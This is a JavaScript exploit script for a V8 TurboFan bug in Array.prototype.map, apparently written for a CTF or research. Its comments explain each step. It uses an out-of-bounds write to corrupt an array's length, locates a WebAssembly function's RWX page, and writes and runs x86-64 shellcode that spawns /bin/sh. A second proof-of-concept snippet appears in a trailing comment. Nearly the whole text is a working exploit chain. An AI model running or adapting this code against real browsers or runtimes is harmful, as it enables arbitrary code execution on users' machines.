function dp(x){}//{ %DebugPrint(x);}
const print = console.log;
const assert = function (b, msg)
{
	if (!b)
		throw Error(msg);
};
const __buf8 = new ArrayBuffer(8);
const __dvCvt = new DataView(__buf8);
function d2u(val)
{ //double ==> Uint64
	__dvCvt.setFloat64(0, val, true);
	return __dvCvt.getUint32(0, true) +
		__dvCvt.getUint32(4, true) * 0x100000000;
}
function u2d(val)
{ //Uint64 ==> double
	const tmp0 = val % 0x100000000;
	__dvCvt.setUint32(0, tmp0, true);
	__dvCvt.setUint32(4, (val - tmp0) / 0x100000000, true);
	return __dvCvt.getFloat64(0, true);
}
const hex = (x) => ("0x" + x.toString(16));
function getWMain()
{
	const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
	const wasmModule = new WebAssembly.Module(wasmCode);
	const wasmInstance = new WebAssembly.Instance(wasmModule, {});
	return wasmInstance.exports.main;
}
wmain = getWMain();

Array(2**30);
// This call ensures that TurboFan won't inline array constructors.
// I am not clear about its detail

var count = 0;
var oobArr,gAb,gSig;
let a = [,,,,,,,,,,,,,,,,];
//a.length==0x10
//if we change this,
//offset in fill should be changed correspondingly
function mapping(a) {
	return a.map(function (x)
	{
		if (oobArr == undefined)
		{
			oobArr = [13.37];
			// create an array after array created by map
			// so that OOB write can rewrite its length
		}
		count++;
		if (count > 0x1000)
			throw Error("otherwise page fault");
		// because page size of from-to space is smaller than
		// expected FixedDoubleArray length
		return x;
	});
}

for (var i = 0; i < 0x2000; i++)
{
	mapping(a);
	mapping(a);
}// JIT

// Now lengthen the array, but ensure that it points to a non-dictionary
// backing store.
a.length = (32 * 1024 * 1024)-1;

a.fill(1337,0x1c, 0x1d);
// oobArr.length <- double(1337)
// although I am not sure why generated array is a FixedDoubleArray
a.fill(0,0x22);
// skip data that has already been allocated,
// and only rewrite blocks that have not been allocated yet
// which does not make any difference
// and we need this fill to make sure `a` is FixedArray
// since too may empty slot makes `a` dictionary elements
a.push(2019);
a.length += 500;
// now `a` is still a FixedArray,
// but array generated from a will be dictionary elements
// Now, the non-inlined array constructor should produce an array with
// dictionary elements

dp(a);
try
{
	mapping(a);
	// this creates a new array with dictionary elements
	// but it will be used as DoubleFixedArray
	// (not sure why not FixedSmiArray)
	// since size of NumberDictionary is only (2+0x10) * 8
	// OOB write can be triggered
	// and elements in `a` are crafted to only perform
	// oobArr.length <- double(1337)
}
catch (e)
{
	// catch the throwed error
	// so writing stop before any crash occur
	// now oobArr is corrupted without any crashes
	dp(oobArr);
	gOobArr = oobArr;
}

assert(gOobArr.length === 1083499520,//double(1337)
	"failed to corrupt array size");

gAb = new ArrayBuffer(0x321);
gSig = {a:0xdead,b:0xbeef,c:wmain};
// we can create gAb and gSig here,
// and they are not too far from gOobArr
// but if we create them just after oobArr is created
// e.i. just after `oobArr = [13.37];` before
// vuln cannot be triggered, not sure why

// regular OOB array exploit:
// now gOobArr have OOB access
// next, we find ArrayBuffer and sig
var backingPos, wmainAddr;
for (let i = 0; i < gOobArr.length-2; i++)
{
	if (d2u(gOobArr[i]) === 0x321)
	{// find ArrayBuffer
		backingPos = i + 1;
	}
	else if (d2u(gOobArr[i]) === 0xdead00000000 &&
		d2u(gOobArr[i+1]) === 0xbeef00000000)
	{// find sig object, and extract wmain address
		wmainAddr = d2u(gOobArr[i+2]) - 1;
	}
	if (backingPos !== undefined && wmainAddr !== undefined)
		break; // otherwise GC is triggered
}
assert(backingPos !== undefined, "failed to find ArrayBuffer");
assert(wmainAddr !== undefined, "failed to find sig array");
print("[*] index of backing field = " + hex(backingPos));
print("[*] address of wmain function = " + hex(wmainAddr));
const dataView = new DataView(gAb);

gOobArr[backingPos] = u2d(wmainAddr-0x300);
for (var i = 0; i < 0x300; i+=8)
{
	rwxAddr = d2u(dataView.getFloat64(i, true));
	if ((rwxAddr / 0x1000) % 0x10 !== 0 &&
		rwxAddr % 0x1000 === 0 &&
		rwxAddr < 0x7fffffffffffff)
		break;
}

assert(i !== 0x300, "failed to find RWX page!");

print("[*] RWX page = " + hex(rwxAddr));

gOobArr[backingPos] = u2d(rwxAddr);
// set backing field to rwx page

var shellcode = [
    0x99583b6a, 0x2fbb4852,
    0x6e69622f, 0x5368732f,
    0x57525f54, 0x050f5e54
];
for (var i = 0; i < shellcode.length; i++)
{
	dataView.setUint32(i * 4, shellcode[i], true);
}
// write shellcode to rwx page

wmain();
// execute the shellcode

throw Error("failed to get shell");

/* another PoC: Impact version: 6.1.462+
var arr = [1];
for (var i = 1; i < 30; ++i) {
	//print(i);
    var a2 = arr.map(function(){arr.push(2);});
    arr.some(arr.constructor);
    print(arr.length)
    for (var j = 0; j < 10000; ++j) {}
}*/
